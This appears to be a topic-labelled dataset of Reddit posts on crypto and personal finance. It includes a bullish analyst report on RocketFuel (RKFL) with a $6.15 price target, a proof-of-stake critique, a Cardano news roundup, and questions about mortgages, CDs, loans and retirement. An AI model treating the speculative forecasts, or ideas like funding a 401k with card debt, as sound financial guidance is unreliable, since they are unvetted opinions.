The payments segment dominated the market in 2020 and accounted for more than 44.0% share of the global revenue. Blockchain technology improves payment system efficiency, minimizes operating costs, and offers transparency. These benefits provided by blockchain technology are increasing its use in payment solutions, thus, driving the segment growth. At the same time, blockchain reduces the need for middlemen in payment processing, which is also a major factor driving the segment growth. 

Bitcoin (the largest cryptocurrency) is the most popular application of blockchain, but increasingly this innovative technology can be used in various business and commercial purposes. The elimination of the middleman in various transactions and processes promises a much more efficient workflow using blockchain. Additionally, increasing concerns about privacy and security make blockchain an ideal technological pipeline for modern processes. 

Enter the eCommerce application. 

**ROCKETFUEL: THE GAME-CHANGER** 

When validating a new market or technology, it is instructive to review history as it tends to repeat itself. Most major technology breakthroughs and disruptions had a few things in common: 

* A large, inefficient market, usually based on old technologies and processes, generating problems and unnecessary cost for all stakeholders. 
* A new technology allowing new companies to invent new solutions that address these problems. 

Some examples include improved internet technology which enabled Amazon to evolve our commerce habits from brick and mortar to digital and mobile technology innovations and evolutions that have led to Uber and Lyft transforming transportation.  The payments industry is no different. Its architecture and operations are still based on a 40-year-old physical card with a chip and limited fraud prevention capabilities. In contrast, digital technologies such as blockchain and cryptocurrencies are prompting the replacement of the old architecture with a new efficient, lower cost approach. y changes the way payments are made. 

There is a huge inefficient market (the payment market) causing problems for all stakeholders. There is a technology that has the potential to fix it. Enter RocketFuel Blockchain. 

RocketFuel is a new frictionless blockchain based payment solution for eCommerce merchants to accept payments in crypto or cash via bank transfer and receive payment and shipping information in one one-click transaction without the need for payment intermediaries. In anticipation of a major proliferation in crypto utilization for payments and business, large eCommerce and retail merchants now accept crypto as a payment method. In fact, over one-third of all small and medium-sized U.S. companies already accept Bitcoin as a B2B payment source. 

The eCommerce space is estimated to be $3.5T, yet it represents less than 15% of total commerce. PayPal, a significant player in the online payments arena with over 350M users, allowed users to buy and sell crypto and just announced its “Checkout for Crypto” feature. This function, allows users to instantly convert their Bitcoin, Ethereum, Litecoin, or Bitcoin Cash to US dollars (with no additional transaction fees) that PayPal then uses to complete the transaction. In our view, this is a validation of the RocketFuel approach and will likely capture its share of this function. Still, since it lacks the 1-click convenience and appears to still be clunky and expensive relative to our forecast of the RocketFuel pricing, RocketFuel remains in the driver’s seat. 

As mentioned above, existing solutions are costly, impact conversion, not secure, leads to fraud, and will eventually go the way of the milkman. Merchants and consumers alike crave security, convenience, transparency, low cost and trust.   

***The*** ***RocketFuel*** ***Approach*** 

The Company provides check-out and payment systems directly on the check-out page that securely automate and simplify the way online payment and shipping information is received by merchants from their customers. The check-out systems are designed to enhance customers’ data protection, enabling consumers to pay for goods and services using cryptocurrencies or by direct transfers from their bank accounts without exposing spending credentials such as credit card data. At the same time, the check-out systems are designed to increase the speed, security and ease of use for both customers and merchants and include a merchant portal that provides detailed transactions and metrics about payments received by the merchant. 

They also include a customer portal where shoppers are able to track their payments, configure payment defaults and connect with various cryptocurrency exchanges and banks to facilitate payment to merchants. Merchants are able to integrate a unique pop-up user interface that allows customers to pay directly from their ecommerce checkout page with no need to redirect to another website or web page. 

Data is key and the merchant portal is updated instantly when a payment transaction is made on the merchant website. The merchant is notified of the transaction and can see the transaction details, including the customer that made the transaction, the transaction amount and the transaction items. This information is added to the merchant dashboard where various metrics are tracked and displayed to the merchant, including information about the various cryptocurrencies that are used for payments to that merchant and the funds received by the merchant from the different currencies. 

Customers of merchants that use the RocketFuel payment solution are able to track their payments in their online portal. They are also able to track payments they made to all the merchants that are integrated with the RocketFuel payment technology within one consolidated user portal. They are able to connect to multiple exchanges including Coinbase, Binance, Kraken, Gemini and others to pay directly from them. They can also pay from any cryptocurrency wallet. Customers are able to connect with multiple bank accounts to pay from as well. 

📷The “single-click” RocketFuel check-out solution is based on a streamlined check-out process for eCommerce purchases. The payment user interface is displayed as a stand-alone popup that allows the creation of new accounts as well as payment directly from crypto exchanges, crypto wallets, and bank accounts, with no redirects to browser tabs or pages. This can be integrated as a plugin on the merchant checkout page or as a browser extension. The plugin comes integrated with popular ecommerce platforms including WooCommerce, Shopify, Prestashop and others. The payment interface is designed for both web and mobile checkout experiences. Merchants are able to integrate the RocketFuel payment interface to their checkout page with software development kits (SDKs) that are available via the merchant portal. Application programming interfaces (APIs) are also available to the merchant for deeper integration into backend systems, ERP platforms, and other third-party platforms. 

Cryptocurrencies are stored in different types of cryptocurrency wallets. These wallets can include mobile wallets, web wallets, desktop wallets, hardware wallets, and exchange wallets. Currently, it can be a difficult, confusing and multi-step process to use these wallets to make cryptocurrency payments. With RocketFuel’s blockchain solution, cryptocurrency holders can use any of the above digital wallets to make payment for products or services to any RocketFuel merchant with 1, 2, or 3 steps. 

Using the “single-click” RocketFuel check-out technology and check-out button, consumers will no longer be re-directed to a third-party  With the RocketFuel solution, eCommerce merchants will need no contact or other information exchange with the consumer in order to receive their payment or shipping details. Instead, they will have immediate visibility of payments from customers via the RocketFuel payment system, which may be integrated into merchants’ fulfillment centers. 

Looking ahead, the technology will also be used for different scenarios, including paying for services, paying invoices, and other payment strategies. In addition, under a future version of the payment system, advertisements in which the entire check-out process is embedded will be able to be placed on third party websites and sales may be completely finalized there. Thus, the platform will enable eCommerce strategies that can include advertisements with a fully integrated check-out process. This prospective feature is unlike any other currently in use today and could eventually be a significant driver of revenue, once completed. Such advertisements will provide significant new sales channels to retailers that are simply not possible with legacy check-out solutions. 

In addition to potential competition from PayPal, the primary competitor remains Bitpay, which is already well established as the leading crypto payment technology in the market, having been founded in 2011. Given that RocketFuel offers a better user experience for crypto payments, allows payment from dozens of other cryptocurrencies, and other wallets, and exchanges, RocketFuel’s diversity is a major strength.  RocketFuel also offers services that Bitpay currently does not, such as providing merchants immediate visibility of payment transactions, real time metrics of transactions and customers, easy integration to ecommerce checkout as well as deep integration to backend platforms. Furthermore, with an average of 72,000 transactions per month, it will not take significant merchant penetration for RocketFuel to surpass Bitpay, in our view. 

***Target Markets***  

The Company’s initial target market is the travel industry and RockeFuel already has signed up two sizable customers: Sky Tours and Military Fares. It should be noted that worldwide sales of flight tickets sold online in 2019 was $540B and the 2 largest reservations systems generate more than $10B in yearly revenue, making this vertical a hot commodity. Management plans to target travel merchant and web platforms. Given the complexity of the intermediaries and reservation systems, high costs and notoriously delayed payments, the RocketFuel solution can simplify the payment process and customers no longer have to provide sensitive information. We believe other verticals such as online gambling, the procurement of gift cards, and high-ticket items could prove to be lucrative for the Company. As a result, we expect sales and marketing headcount to rise over the next 12-18 months, in conjunction with rapid deployment and implementation of existing and future solutions.

**FINANCIAL FORECASTS** 

*(Analyst’s Note: These forecasts are our own and we did not receive guidance or projections from RKFL management.)* 

Our forecasts largely reflect the typical growth inherent in new technology firms from early mover/early adopter stage to mass market appeal. Plus, the speed with which adoption in the online world occurs tends to be faster than most historical segments, further bolstering our investment thesis and projected growth rates. The variables in our forecasts tend to be in the average fee percentage charged to merchants as well as revenue derived via license. It is too early in the maturation cycle to estimate such revenue breakdowns or figures. 

To simplify and streamline our initial forecasts, we have estimated $100M in business transacted at an average fee of 1.8% for FY22E or Year 1 (Apr 2021-Mar 2022), reduced to 1.5% on $800M in transactions in FY23E and $2.5B in transactions for FY24E. While we believe additional revenue streams could be booked in FY23E, we view such contribution as a bonus at this time. However, we do project $2.5M in licensing revenue and other fees in FY24E. Based on this model, we project revenue of $1.8M in FY22E with a loss of $2.45M, or ($0.09) as management begins meaningful sales and marketing expenses to build awareness and execute merchant signups in key verticals such as the travel industry and online gambling.  

In FY23E, we forecast significant revenue growth with top line reaching the $12M mark. Total operating expenses are estimated to reach $8.25M with expanded sales and marketing expenses, along with R&amp;D, reflecting upgrades to the core functionality. Based on this model, net profit is slated to reach $650K, or $0.02, with a slight rise in shares outstanding to reflect a modest fundraise in conjunction with a prospective up-list to NASDAQ. We preliminarily project $40M in revenue ($37.5M in transaction fees and $2.5M in licensing fees) for FY24E with net of $7.3M, or $0.22, and a net margin of 18.3%. 

It should be noted that while there are not material direct COGS, we have allocated some indirect expenses to arrive at a gross margin of around 72-73% for all years. We believe that this is conservative and may have to be adjusted higher, thereby raising profitability and our price target. 

**RISK FACTORS** 

In our view, the Company’s biggest risks are straightforward: the timing and magnitude of broad adoption of its core technology and applications by both merchants and consumers. Secondary risks include changes in the regulatory environment affecting utilization along with marketing effectiveness. Competitive risks include lower pricing, more effective sales/marketing, greater functionality and features. The aforementioned risks could come from larger competitors, existing firms, or new entrants. Still, these future concerns are consistent with firms of RocketFuel’s size and early mover standing. Moreover, we believe that the Company’s seasoned management team is prepared to overcome these hurdles and generate significant top-line growth, deployment and  implementations. 

Volatility and liquidity are typical concerns for microcap stocks that trade on the over the counter (OTC) stock market. In addition to a recent funding access announcement regarding Triton Funds, management may seek to raise additional capital next year in conjunction with an up-list to NASDAQ, to fund corporate expansion and potential M&amp;A. An overriding financial benefit as a public company is the favorable access to and the availability of capital to fund product launches, consistent marketing campaigns and other initiatives. Since the proceeds of any future funding would be used in large part to advance major business development and sales, we believe that any dilutive effect from such a funding could be offset by related increases in market value. 

**VALUATION AND CONCLUSION** 

RKFL is an early mover as a global provider of one-click online payment options using Bitcoin and 40+ other cryptocurrencies. Moreover, RKFL is the first cryptocurrency payment service to provide a seamless one-click checkout experience. The market is huge and growing at an enviable rate. According to Markets and Markets, the blockchain technology market is expected to reach the $39.7B mark in 2025, up from $3B in 2020. 

Current eCommerce methods are outdated, problematic, and costly, while the Company’s platform is designed to improve the merchant and customer experience. Implementation should lead to lower merchant costs, potential recurring business and may foster customer loyalty.  

Management has a proven track record of developing new technologies, bringing them to market, and generating value for the investors. The CEO has exited 5 other companies. Thus, we envision RKFL emerging as a takeover candidate. At present, our forecasts suggest sales will jump from $1.8M to $40M in 3 years, with meaningful EPS. Stocks tend to generate their greatest gains when the transition from early adoption to mass market appeal begins, which could begin in late 2021. 

Given the game-changing technology and its resultant impact on the use of cryptocurrencies along with ecommerce efficiency and volume, we believe that RKFL could be afforded premium valuations as adoption occurs. Going forward, we recommend investors value the Company based on milestone events such as merchant signup as we view 2021 as a key infrastructure, proof-of-concept year, with major revenue growth in the cards in 2022 (fiscal 2023). Our 6-12-month target of $6.15 reflects a reasonable 4x our FY24 (CY23) sales estimate of $40M and roughly 28x our $0.22 EPS forecast. This target could prove to be conservative if adoption accelerates later this year or in early 2022. 

Finally, we believe that as a critical mass adoption among merchant occurs, the Company could emerge as a takeover candidate by a leading payment services or provider entity. RocketFuel’s leadership has an enviable history of building and selling technology start-ups at key inflection points. While this event may not occur, it may have an occasional impact on valuation and should provide further confidence in management’s capabilities.",cryptocurrency

## The Worst Kind of Centralization

Under this algorithm, changes to protocol code is not determined by miner consensus, but by a vote from staking wallets. Additionally, the protocol weighs votes based on the holdings of staking wallets. So whoever has the most money has the most influence over a vote.

This means that a small group of wealthy stakers can control the entire network, voting on changes that benefit them — even at the cost of the rest of the network. Under such a system, a large entity or wealthy group, such as a central bank, can use fiat money to purchase vast quantities of a PoS coin, hold them until their wallets become eligible for staking, and then take over the network.

Once the network has been infiltrated and seized by these interests, they can do things that make the PoS system less efficient and more dangerous than it already is. For example, controlling interests in a PoS network could vote to remove the supply cap. And since they have the highest holdings of staking coins, they get the highest cut of the new coins — giving them majority control over the monetary supply.

Such a vote would essentially create a central bank, allowing controlling stakers to use and distribute newly-minted coins as they please. In other words, they can conduct central banking monetary policy.

Consequently, economic cycles, politics, and corruption will enter the equation, throwing the PoS-based economy into chaos.",cryptocurrency
cardano,Cardano Rumor Rundown 04.05.21,"Hey Everyone!

I've been over consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list.

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

2. Charles says they are actually going to hire investigators for the IOG anti-scammer team.  People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon.  Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

7. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
8. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem.  To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
9. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the  transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”.  When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase.  The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
10. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to acquire Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

12. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher.  Right now the corporate world is considering holding BTC on their balance sheets.  But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

personalfinance,27 Year Old Unsure on Next Step,"I am looking for advice on where to start moving some of my income the next couple of months.

Info/Income: I am an unmarried/no kids 27 year old who makes $80,000 base salary with a once a year bonus based on sales/performance, this upcoming year could be anywhere from $50,000-$100,000 in bonus money on top of my base salary. Right now monthly expenses all in are $2,500 and I have about $1,600 leftover each month after taxes/deferrals are taken out.

Savings: Regular bank account has about $11,500 in it. IRA of $20,000 not currently contributing. And new job 401k of about $1,500 only contributing 3% right now.

Liabilities: I have student loans of about $54,000 at 4.2% , credit card of about $5,500 at 18%, and 1 year left on a car loan of about $5,500 at 3.7%.

Thoughts: I am waiting to get to around $15,000 in savings, which should happen by the Summer, and then open up a high yield account to put about $10,000 in there and then keep the other $5,000 in my current bank for month to month expenses etc. My thoughts were to focus on paying off the credit card since it is about 18% interest rate and then after that either start to contribute more to my 401k and start to contribute to my IRA again, or possibly open up a brokerage account with TD or Vanguard for more growth that I can draw from if needed down the line for a house. Once bonus time comes around I was planning on taking a chunk and knocking out 25-30% of the student loan to get the principal down and then taking whatever is left over and maxing my 401k out for the year and throwing the rest into the IRA or brokerage account.

Both my 401k and IRA are aggressively allocated so does it even make sense to contribute to both? Should I open a brokerage account and just funnel most of the money there once I am at that point? Looking to possibly buy a house within 2-3 years so should I just sit on that excess cash once the bonus comes and throw it all into the high yield and just wait? Any advice or thoughts are appreciated.",finance
stocks,Is The U.S. Finally Embracing Tidal Energy?,"SOURCE: https://oilprice.com/Energy/Energy-General/Is-The-US-Finally-Embracing-Tidal-Energy.html

By Tsvetana Paraskova - Apr 05, 2021, 12:00 PM CDT

The United States has made the first step toward harnessing the potential of wave energy, a powerful source of renewable energy which researchers have been studying for decades.   
The Federal Energy Regulatory Commission (FERC) issued last month a license for what would be the first commercial-scale, utility grid-connected wave energy test site in the United States.
Oregon State University received that license to build and operate the PacWave South testing facility as the industry is developing technology and devices potentially capable of harnessing the power of ocean waves.
Despite decades of studies, wave energy is still little developed—both in the U.S. and elsewhere—because researchers are still looking at ways to reconcile feasibility and costs in a complex marine environment.
In theory, the potential is enormous. In practice, wave energy will need a lot more testing and technology development if it hopes to become a viable renewable energy source.
Nevertheless, a testing facility operational by the middle of this decade could give the impetus the U.S. industry needs to test various technologies for generating electricity from waves and attract investors in the most promising technology. The Biden Administration’s support of renewable energy could also help with industry innovation.
The U.S. is one of the best places in the world for ocean wave energy generation, according to the Energy Information Administration (EIA). Ocean waves have tremendous energy, and the theoretical annual energy potential of waves off the coasts of the United States is estimated to be as much as 2.64 trillion kilowatt hours (kWh). This equals around 64 percent of U.S. electricity generation in 2019, the EIA says.Related: U.S. Oil Production Is About To Climb
The potential is there, and it is tremendous. Still, the industry now needs to test and possibly show that wave energy can make a difference with viable solutions in the drive for boosting renewable energy generation.
Oregon State University’s project leaders hope to obtain from FERC construction authorization for the PacWave South testing facility later this spring. Current timelines suggest that construction could begin this summer, and the facility could be operational by 2023, OSU says.
“We know there is still work to do to make this project a reality, but this is a huge moment for this project and for the industry as a whole,” Burke Hales, chief scientist for PacWave, said in a statement.
The World Energy Council estimates that 10 percent of the worldwide electricity demand could be met by harvesting ocean energy, OSU said.
The PacWave test facility could be the companies’ place to showcase technology in order to attract investors in their proposed developments, according to Hales.
“Even somebody like Bill Gates isn’t going to pay somebody millions of dollars to do tests that they think will fail,” Hales told Grist’s Ysabelle Kempe.
Innovation and testing of devices could unlock the tremendous energy potential of ocean waves, which is highest along the Pacific shorelines: California, Oregon, Washington, Alaska, and Hawaii, according to a recent study of the National Renewable Energy Laboratory funded by the Department of Energy. The study focuses on the technical resource—the proportion of the theoretical resource that can be captured using existing technology options.
The study found that utilizing just one-tenth of the technically available marine energy resources in the 50 states would equate to 5.7 percent of the current U.S. electricity generation, or enough energy to power 22 million homes. 
DOE’s Pacific Northwest National Laboratory has identified “energy hotspots” of wave power along the Washington, Oregon, and California coasts.
“Wave power is a significant, sizeable resource,” marine coastal science advisor Simon Geerlofs says. Yet, he noted that wave energy still has challenges to overcome, including big hurdles like ensuring durability and efficiency of wave energy converters and cost-competitiveness with other energy resources.",finance
personalfinance,30-year or 15-year loan?,"What questions should I be asking myself when deciding on the type of mortgage to take out?

CryptoCurrency,Why I think Centralized Coins should not be held for the long-term,"We all know that most of our biggest gains are from shitcoins. Recently, a lot of people have been getting into Binance Smart Chain (BSC) tokens and there's nothing wrong with that; it's their money after all. Personally though, I only view BNB and all BSC tokens as short-term holds since I can't trust these centralized coins. 

Some people say that CEX coins are most likely to pump due to their price performance and more people will get into them. While possible, I think that if a single entity has the final verdict on how a coin should be with regard to fees and the like, that's already something to be concerned about. We don't want to be giving a certain group of people too much power.

This reminds me of Facebook's cryptocurrency, Libra/Diem. I'm glad it didn't push through due to controversies. We've had enough propaganda and manipulation fed to us through Facebook. Now they'll have the ability to take control of our finances? Scary IMO.

Now if in the future, some CEX coin becomes the No.1 crypto, what's to stop something like Facebook from buying the company?


Something to think about


TL;DR: Centralized coins are good for short-term gains but not so much as an actual currency in the future.",cryptocurrency
personalfinance,What's the fundamental difference between mortgage and credit cards?,"Mortgage is good debt and cards are bad debt, right? Why is that - is it just the interest rates or because cards are revolving and mortgage is fixed term? I think there's a more fundamental difference, and understanding it could make card debt less problematic.

I think a mortgage secures an asset for you that supposedly appreciates in value. Cards are used for consumption with no asset creation. If somehow card money were used for assets, for example to contribute to 401k, that would be good debt. We'd only have an APR problem remaining. But there's 0%/low APR offers. Hypothetically, would it make sense to swipe a card towards a 401k? S&amp;P is delivering over 10% lately, 7% on average, room to put card debt to work.

Curious what you think.",finance

personalfinance,Should I get a shorter (&lt; 3 years) or longer term (5 year) CD?,"I’m a 24F grad student who has been saving aggressively since I was 17. I come from a very patriarchal family where my dad was the primary breadwinner and my mom was a SAHM of myself and my 4 sisters; my dad was very controlling financially and that motivated me to a get my first job in high school, with my long-term goal being financial independence and eventual home ownership. Throughout college and my gap years from university (I graduated from college 2 years early so I was able to take a longer gap before grad school and save more aggressively), I’ve been able to save up nearly 70K that I intend to put in a CD and designate as the money I will use as a down-payment on my future home. I also have a separate savings set aside along with scholarships that will put me through the next 2 years of grad school in the even that I can’t work part time while taking classes. I do have a little under 40K in federal student loan debt that I will not have to pay until after I finish grad school, but did make a couple thousand in payment towards them until the pandemic froze interest and payments temporarily. My last job before grad school I made about 60K/year, which is what helped to put me in an advantageous financial situation with no family help and despite the pandemic. Once I graduate from my program, starting salary in my field is 100K+ (medical provider). I was wondering how soon after I graduate should I look into buying a house? This is what will determine how long of a CD term I will choose. I’ve had money in a CD before, however both times they were only 12 month, no penalty CD’s as I wasn’t sure if I would need the money for a large purchase or major financial decision (I never did, so I’ve already been used to not touching the money/acting like it’s not there). I’m leaning toward a 5 year CD due to the higher rates, but I feel like I will definitely feel ready to purchase a house in the next 3-4 years, although there is a significant decrease in the rates for the shorter CD terms.

personalfinance,Does an app like this exist?,"I'm new to sharing an account with my partner. We've always maintained our own accounts and had our separate bills we are responsible for, and our own budgets. We are going to get married next year and we decided we should also have a joint account, in addition to our separate accounts for groceries and saving up for a wedding. It turns out this new account has a 2% interest rate on the checking account and the credit card we got through the same institution has some great cash back rewards. We are thinking of using this more as our primary account so we can get interest on our money. 

Since we're both used to maintaining our separate finances, we both already have a set of bills and a budget that works for us, we'd like to still maintain that paradigm even if our money is sitting in the same account. Are there any apps that give you a simplified way of logically partitioning out a single bank account?

I'd like to just see:

1. Total $$ in our account
2. Total set aside for groceries
3. Total $ that is mine
4. Total $ that is my partner's

The only other thing needed is a way to post a transaction to one of those categories to either credit or debit it and change the total in the account.

I tried my bank's online tools and they have the same pitfalls that other budget apps I've tried like everydollar where it's built to be a budget and trying to shoehorn this paradigm into a traditional budgeting app doesn't work very well. For instance, I created the above categories in everydollar and filled them out with dollar amounts, then I posted a transaction and it doesn't actually change the amount in the category because it's looking at those amounts as a fixed budget. It doesn't even update the total on the account.",finance

stocks,"Here is a Market Recap for today Monday, April 5, 2021","**PsychoMarket Recap - Monday, April 5, 2021**

Stocks jumped on Monday, continuing their strong performance from last Friday, with the S&amp;P 500 (SPY) and Dow Jones (DIA) recording fresh highs. The tech-heavy Nasdaq (QQQ) outperformed, closing the day 2% up. Market participants remain encouraged by President Biden’s recent infrastructure proposal, a better-than-expect monthly job report, and are looking ahead to a week of commentary from Federal Open Market Committee (FOMC) members. 

The March Jobs Report blew past consensus estimates to record the fastest pace of job growth since last summer. Nonfarm payrolls increased by 916,000 for the month while the unemployment rate fell to 6% (unemployment rate was 14.6% in April 2020). Economists surveyed by Dow Jones had been looking for an increase of 675,000 and an unemployment rate of 6%. Quincy Krosby, chief market strategist at Prudential Financial said, “It \[the jobs report\] shows that the economy is healing, that those who lost their jobs are coming back into the workforce as the recovery continues and restrictions are lifted.”

President Biden’s plan, called the American Jobs Plan, proposes to spend $2.25 trillion over 8 years to rehabilitate and build out the nation’s transportation infrastructure, expand domestic manufacturing and workforce development, modernize the electrical grid, and fund the research, development, and implementation of clean energy technologies. See a full list of items from the bill [here](https://finance.yahoo.com/news/biden-infrastructure-plan-details-113700242.html). 

Looking ahead, this week will be chock full of commentary from Federal Open Market Committee (FOMC) members, who will offer their assessment of the latest batch of economic data and how they will proceed. . Chicago Fed President Charles Evans, Richmond Fed President Thomas Barkin and St. Louis Fed President Jim Bullard are each slated to deliver public remarks later this week, and Fed Chair Jerome Powell will speak at an International Monetary Fund (IMF) panel regarding the global economy Thursday afternoon. In a note to client, Wells Fargo economist Sam Bullard said, “ ""While the consensus of the FOMC continues to suggest that the committee will wait for their forecasts to be realized before taking policy action, it will be interesting to see if there is any intense discussion about the implications of the stronger outlook, particularly around inflation. Most Fed officials expect any pick-up in inflation to be “transitory,” yet we suspect there are a few officials that are pushing back on that narrative.""

personalfinance,3.75 interest rate on my mortgage 2.99 on refi?,"Hello all.

I've been a home owner for just about a year and a half,  800+ credit score and no debt outside of this mortgage. I've been considering refinancing and quicken loans offered me a 2.99 interest rate on a refi versus the 3.75 I currently have. This would take my mortgage payment from 1557 to 1407. It seems like a win, however the quicken rep said it would cost 12,000 but it would be rolled into the refi loan. (No out of pocket)

Just looking for some guidance if this is a good deal or should I keep shopping? 

Is 2.99 the best on a 30 year fixed?",finance
personalfinance,Does it make more financial sense to contribute to my Roth IRA or pay down my student loans quicker?,"Recent grad living with parents with FT job paying ~60k/yr. I currently owe ~42k in federal student loans. My plan is to move out sometime this year and at that point I will have a 4k “move out fund” and 10k in cash as an emergency fund (grew up poor, so that is an amount I feel comfortable having on hand when I live on my own despite 3 mos expenses being around 6k)

My current plan once I move out, is to drop my savings rate to $500/month and contribute that to a Roth IRA instead of my savings account. Using the 10yr repayment schedule, my student loans work out to a little under $500 a month as well. 

All of my loans are relatively low interest (I’d say average 5%). 

Does it make more sense to maybe send that extra $500 that I would be contributing to my Roth to my loans to pay them off faster? Basically just want to figure out if the compounding gains from my Roth will outpace the 10,000 of interest I’ll pay over 10years. Which seems negligible to me based on career trajectory and future earnings",finance
personalfinance,Can I still claim unemployment if hired as an independent contractor?,"I know that pretty much the only decent thing about being an independent contractor in Texas is that neither I, nor my employer, have to go to the state to report anything until I report my federal taxes at the end of the year (or pay them quarterly/ as I go) and as such was wondering I I had to stop claiming unemployment since I’m not technically employed by anyone other than myself. 

   I’ve had some friends say that I would be able to keep applying for and receiving unemployment for as long as I was originally approved for (was laid off of a job at lowes) even if I get hired as an independent contractor because neither I nor the company report that I was “hired” to the state. 

   I didn’t believe them at first but they kept insisting and I wasn’t able to find anything online saying I couldn’t. Just curious if this is a way to collect income and still get unemployment. If so, that’ll make my current situation of finding out I might be misclassified as a 1099 worker a bit better and soften the blow a little bit.",finance

personalfinance,Weighing Living at Home Versus Getting An Apartment While Having Student Debt,"Hello! I am a soon to be graduate from college and landed myself a job paying just under $80k per year, 5k signing bonus and I am leaving school with approximately $50k in student debt. All debt is in government loans, simple interest on the principal and daily accumulations (rate/365) and interest is frozen until September. The equivalent interest rate (loan disbursements were given different but set rates) I'm paying is essentially 4.5% and that should quickly decrease as the principal falls. If I made no payments on the loans they would accrue approximately $2,000 a year in interest, although that is not the case at all. I plan on tackling my debt aggressively, but still have some other considerations. 

Home is a bit hectic at the moment and as a recent college graduate with a few years in-field experience and a new job I'm considering moving out. Rent in my area will likely be around $1,000-$1,500 a month for a decent 2 person apartment. I'd be rooming with a friend with similar financials. My parents asked I pay $400/month if I don't move out. The pro's of living alone such as a bit of distance, privacy, and independence are difficult to weight against a physical dollar. Does anyone have advice on how to begin even considering my options? Should I stay home for a year or will my financials still survive if I move out now? Regardless of either option I plan on tackling my debt as aggressively as possible and making minor 401k contributions the next couple of years until it is gone. I figured market returns are around 5% for things like index funds on average and the 0.5% difference in gains (against 4.5% loan interest) when it comes to the time value of money isn't worth the peace of mind from wiping debt instead. Job does not offer 401k match, but has killer bonuses above 10%.

I'd love to hear some advice on proceeding as it is quite difficult to think objectively especially with non-tangibles on the table. I suppose I'm asking if moving out is reasonable when considering my debt, rent, and income, not which is better. Financially living at home is a no-brainer, but for my mental health it may not be. If it is a **terrible** financial play then that outweighs the family issues. I am in good standing with my family, but there's a lot of friction between the rest of the household.",finance

Outstanding balance is $261,680

Current interest rate is 2.75% I'm 7 months into 30 year term

New interest rate is 2.25% I would start a new 30 year term

Closing costs $1906

I believe the closing costs are tax deductible leaving $1300 or so in closing costs. Also closing costs are rolled into the loan so out of pocket cost is $1.

Monthly savings is $70. 

This works out to a breakeven time of 18.6 months. I'm planning on living here for at least 15-16 months, but it's a slower market so we may end up owning the house for longer if it doesn't sell.

personalfinance,How to find out if i'm on course to retire.,"So ~~I'm going to try and keep this brief~~  I'm 37 and starting to look seriously towards my retirement. The main problem I face is too much information and people trying to sell me stuff(insurance ect), and frankly leaving these retirement sessions More confused then I started.  Some calculators online say i'm going to have plenty of money, others tell me prepare to fight hobos for food  past age 80.

i'm 37 have 142k in my 401k.  I contribute 20% of my pretax income to my 401k. I make 70k pre bonus, my company pays a bonus of 0-24% of my earnings based on performances. Typically hits at 12%,my wife contributes 6% and has roughly 40ish k in her 401k and makes 42k.

**Debt:**mortgage &gt;139,000k left. House is work 300k. 3% interest.  Should be paid off 14 years.-that is it I grew up poorish and distrust credit cards, and interest rates-

**Assets:**142k 401k.

30k Cash for emergency

12k in a Education fund for my son ( 100.00 per week )

Cars  are paid off and we need to start saving for the new one for her.Cars paid off and I always pay cash.

Whole life policy pays out 400k if i kick the bucket through work.

**Stuff I don't understand and don't know if I should include in the calculation.**

**Her family:** My wife has a partnership with her family that is worth roughly 3million dollars of which she forms a 1/3 partnership.  I basically feeds on itself in the sense it reinvests everything but 4% of earnings. Her mother , her uncle form the other two members of said partnership and I just don't know this will shake out when the family starts dying.  Because the partnership  is majority vote rules the  money always gets reinvested and the disbursement of  4% goes back into the pot to grow. At some point my son becomes a partner. However, its all opaque and i don't ask and they don't talk about it so i don't think I can count on it for my wife .

Her Father has a 1,000,000+ and a home in Long island ,  he is semi-retired off . But wants to leave that to her , I don't know how or if that is possible. Or how much to anticipate the tax man taking. Her name is on the account as a person who gets the money if he dies, all I know.

**My family:** My dad's came into a huge windfall when his Autistic brother passed and left him a large sum, and he has a 500k life policy. However, due to my mothers financial incompetence my father doesn't own the home we grew up in. Because well my mom grew up with alcoholics who didn't know anything no one taught her  about money.   I've helped them correct and they have roughly 1.6 million now saved up an a condo (300k )  and a home (100k (80k equity)

